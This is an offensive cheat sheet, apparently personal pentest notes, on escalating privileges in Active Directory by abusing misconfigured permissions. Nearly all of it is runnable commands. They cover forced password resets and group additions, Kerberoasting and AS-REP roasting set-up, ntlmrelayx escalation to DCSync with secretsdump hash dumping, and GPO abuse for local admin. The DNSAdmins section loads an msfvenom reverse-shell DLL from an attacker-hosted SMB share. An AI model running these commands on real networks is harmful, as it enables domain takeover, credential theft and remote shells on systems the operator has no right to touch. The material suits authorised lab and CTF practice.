# Abusing-rights-in-a-Domain

Different domain users, have different rights. Some domain users have GenericAll, GenericWrite, WriteDacl, WriteOwner privilege on other domain users or groups. We can abuse these privileges and move further in domain.


### 1. Abusing GenericAll Privilege

eg: (john have GenericAll priv on Exchange Windows Permissions group)

We can add user in Exchange Windows Permissions group and then we have full control.

```markdown
net group "Exchange Windows Permissions" john /add /domain
```

GenericAll Privilege on adams user. 3-Ways.

1. We can change the adam password.
```markdown
net user adams N3wPassw0rd! /domain
```

2. We can set adams user SPN and do [Kerberoasting](https://k4sth4.github.io/Kerberos/).

Import [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
```markdown
Set-DomainObject -Identity adams -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:jadams /nowrap
```

3. We can set adams account to [AS-REP Roasting](https://k4sth4.github.io/Kerberos/).
```markdown
Set-DomainObject -Identity adams -XOR @{UserAccountControl=4194304}
.\Rubeus.exe asreproast /user:jadams /nowrap
```

### 2. Abusing GenericWrite Perm on a User
Here lily is the user on which we have generic write perm we can set this user to PreAuth and then by using [AS-REP Roasting](https://k4sth4.github.io/Kerberos/) we can get the user hash and crack it and login into system.
```markdown
Set-ADAccountControl -Identity lily -DoesNotRequirePreAuth $true
```
Now we can do [AS-REP Roasting](https://k4sth4.github.io/Kerberos/).


### 3. Abusing WriteDacl Priv on any Group
eg: claire has WriteDacl rights on the Backup_Admins group. We can add it to Backup_Admins group.
```markdown
net group backup_admins
net group backup_admins claire /add
```
NOTE: Open another shell if changes are not reflected.

### 4. Abusing WriteDacl Priv On Domain by grant yourself the DcSync privileges
dan (user) has WriteDacl Perm on DC.

using [Impacket](https://github.com/SecureAuthCorp/impacket) tool:
```markdown
ntlmrelayx.py -t ldap://10.129.95.210 --escalate-user dan
```
(10.129.95.210 = target IP)

nevigate to http://127.0.0.1  and enter the user (dan & pass) now wait till it ask for you to run secretsdump.py on creds

### 5. Abusing WriteOwner Privilege
We're tom user and getting ownership of claire and then change passwd of claire. Import [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
```markdown
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

### 6. Abusing DNS Admin wrights
This way is just for CTFs, in real world this will gonna break the DNS service.

Step1. create a revshell via msfvenom
```markdown
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f dll > shell.dll
```
Step2. set smbserver in the same dir where shell.dll
```markdown
impacket-smbserver -smb2support share .
```
Step3. exploitation on target machine (we don't need to upload shell.dll)
```markdown
dnscmd.exe /config /serverlevelplugindll \\10.10.x.x\share\shell.dll
sc.exe stop dns
sc.exe start dns
```
You will get a reverse shell.

### 7. Abusing ForceChange Password from linux os
login as support user and audit2020 is the user whose passwd gonna change.
```markdown
rpcclient -U support 10.129.1.243 
setuserinfo2 audit2020 23 'Passw0rd!' 
```


### 8. DcSync Attack
mrlky has Get-Changes privilege on the domain.
```markdown
secretsdump.py -just-dc mrlky:Football@10.10.10.103
```

### 9. Abuse GPO Policy 
upload [SharpGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse)
```markdown
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hackzzdogs --GPOName "DCPolicy"
gpupdate /force
```
(hackzzdogs = current user name)

(DCPolicy = Group Policy Name you can find it on bloodhound)

Now we're in local administrator group.
```markdown
net loacalgroup administrators
```

